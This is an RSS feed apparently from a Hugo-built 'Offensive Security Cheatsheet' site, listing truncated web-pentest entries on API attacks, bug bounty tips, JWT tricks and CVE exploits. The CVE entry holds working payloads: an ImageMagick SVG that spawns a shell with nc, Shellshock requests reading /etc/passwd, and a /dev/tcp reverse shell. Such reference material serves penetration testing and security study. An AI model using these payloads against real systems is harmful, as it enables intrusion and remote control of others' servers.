<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web Pentest on Offensive Security Cheatsheet</title>
    <link>/web-pentest/</link>
    <description>Recent content in Web Pentest on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="/web-pentest/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Attacking APIs</title>
      <link>/web-pentest/attacking_apis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/attacking_apis/</guid>
      <description>Resources https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93 https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765 https://github.com/smodnix/31-days-of-API-Security-Tips https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0 https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2 # How to use different known APIs https://github.com/streaak/keyhacks SOAP vs REST # REST uses: HTTP, JSON , URL and XML # SOAP uses: mostly HTTP and XML # SOAP can be more recommandded in terms of security, if you have to process critical data. Checklist # Test tokens # Authentication token, JWT, Base64 encoded... # Input validation # All entry points (command injection, sql injections, html.</description>
    </item>
    
    <item>
      <title>CVE &amp; Vulns exploits</title>
      <link>/web-pentest/cve_exploits/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/cve_exploits/</guid>
      <description>Imagick - CVE-2016-3718 - SSRF Dans un .svg push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(https://example.com/image.jpg&amp;#34;|nc -l -p 7777 -e&amp;#34;/bin/sh)&amp;#39; pop graphic-context Shellshock - CVE-2014-6271 Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock # Shellshock == CVE-2014-6271 # Classic PoC curl -H &amp;#34;User-Agent: () { :; }; /bin/command&amp;#34; http://example.com/ () {:;}; /bin/cat /etc/passwd # Reverse shell () { :; }; /bin/sh -c /bin/sh -i &amp;gt;&amp;amp; /dev/tcp/139.</description>
    </item>
    
    <item>
      <title>Bug Bounty Tips</title>
      <link>/web-pentest/bug_bounty_tips/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/bug_bounty_tips/</guid>
      <description>General # This section will be mainly used to store information found on Twitter # About some bug bounty tips &amp;amp; web tricks Password Reset https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1 # 1/ Include controlled mail as a second parameter # 2/ Bruteforce reset token # 3/ Try to use a reset token on another account # 4/ Try to figure out how token are generated Payloads # Top 25 XSS Dorks https://twitter.com/trbughunters/status/1276851918946603013/photo/1 # E-mail fields are usually less sanitized or filtered # It can be a good candidate for payloads 401/403 Bypass https://twitter.</description>
    </item>
    
    <item>
      <title>MISC</title>
      <link>/web-pentest/misc_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/misc_tricks/</guid>
      <description># Security Headers https://securityheaders.com # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox extension for security https://addons.mozilla.org/fr/firefox/addon/hacktools/ Qsreplace https://github.com/tomnomnom/qsreplace # Accept URLs on stdin, replace all query string values with a user-supplied value # only output each combination of query string parameters once per host and path. cat urls.txt | qsreplace newval https://example.com/path?one=newval&amp;amp;two=newval https://example.com/pathtwo?one=newval&amp;amp;two=newval https://example.net/a/path?one=newval&amp;amp;two=newval JSON Web Tokens (JWT) https://jwt.io/ # If RSA signed, you can try to set HS256 # You need to get the public key # By getting 2 tokens, you can calculate the public key # More info https://crypto.</description>
    </item>
    
  </channel>
</rss>
